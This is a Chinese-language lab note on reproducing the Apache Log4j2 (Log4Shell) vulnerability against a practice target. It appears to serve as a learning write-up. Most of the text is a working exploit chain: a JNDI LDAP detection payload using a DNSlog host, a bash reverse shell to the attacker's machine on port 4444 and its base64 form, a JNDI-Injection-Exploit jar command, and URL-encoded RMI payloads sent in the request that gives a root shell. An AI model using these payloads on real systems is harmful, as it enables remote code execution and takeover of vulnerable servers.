log4j2漏洞浮现笔记

2023-10-07 漏洞复现

log4j2漏洞浮现笔记

1. 访问靶场链接

2. 首先测试该网站存在不存在Apache log4j2漏洞：

先利用dnslog生成一个用于接收回参的网址

构建payload

192.168.2.40:38080/hello?payload=${jndi:ldap://vg8leh.dnslog.cn/exp}

可以发现出现400报错

这里要把${jndi:ldap://vg8leh.dnslog.cn/exp}进行URL编码

可以看到出现ok就是成功了

回到dnslog平台刷新就可以看到记录

说明存在Apache log4j2漏洞

3. 利用漏洞进行反弹

首先要下载一个exp

这里我们直接下载到kali中也可以，工具具体目录在文件中的tools目录下

https://github.com/bkfish/Apache-Log4j-Learning/

构造payload

这里IP是kali的IP，端口是等会nc监听的端口

bash -i >& /dev/tcp/192.168.70.132:4444 0>&1

将其用base64编码

YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjcwLjEzMjo0NDQ0IDA+JjE=

然后进入tools下打开终端再构造

java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C “bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjcwLjEzMjo0NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}” -A 192.168.70.132

回车得

这里将箭头处rmi://192.168.70.132:1099/symxco复制再次构造一个payload

${jndi:rmi://192.168.70.132:1099/symxco}并将其URL编码

%24%7b%6a%6e%64%69%3a%72%6d%69%3a%2f%2f%31%39%32%2e%31%36%38%2e%37%30%2e%31%33%32%3a%31%30%39%39%2f%73%79%6d%78%63%6f%7d

进入kali开启监听（端口为上面bash -i >& /dev/tcp/192.168.70.132:4444 0>&1

设定的4444端口）

将编码内容放在payload=后面进行执行进行反弹即可获取root权限

http://192.168.2.40:38080/hello?payload=%24%7b%6a%6e%64%69%3a%72%6d%69%3a%2f%2f%31%39%32%2e%31%36%38%2e%37%30%2e%31%33%32%3a%31%30%39%39%2f%73%79%6d%78%63%6f%7d
